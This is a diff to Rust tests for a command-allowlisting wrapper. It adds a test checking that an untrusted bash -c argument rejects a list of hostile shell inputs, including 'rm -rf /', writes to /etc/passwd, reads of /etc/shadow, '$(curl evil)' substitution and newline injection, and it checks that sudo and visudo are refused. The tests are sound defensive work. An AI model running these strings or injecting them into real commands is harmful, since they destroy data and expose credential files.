@@ -192,3 +192,34 @@ fn component_image_names_are_not_commands() {
 fn zitadel_bare_rejected_on_linux() {
     assert!(SafeCommand::new("zitadel").is_err());
 }
+
+/// #2621 — the untrusted shell-script path must reject command separators,
+/// redirects, substitution and control characters.
+#[test]
+fn shell_script_arg_rejects_the_adversarial_metacharacter_corpus() {
+    let bash = || SafeCommand::new("bash").expect("bash is allowlisted").arg("-c").expect("arg");
+    for hostile in [
+        "echo a; rm -rf /",
+        "echo a | sh",
+        "echo a > /etc/passwd",
+        "echo a < /etc/shadow",
+        "$(curl evil)",
+        "`id`",
+        "echo a\necho b",
+        "echo a\recho b",
+        "$HOME",
+        "../secret",
+    ] {
+        assert!(
+            bash().shell_script_arg(hostile).is_err(),
+            "must be rejected: {hostile:?}"
+        );
+    }
+    assert!(bash().shell_script_arg("echo hi").is_ok());
+}
+
+#[test]
+fn sudo_and_visudo_are_not_in_the_general_allowlist() {
+    assert!(SafeCommand::new("sudo").is_err());
+    assert!(SafeCommand::new("visudo").is_err());
+}
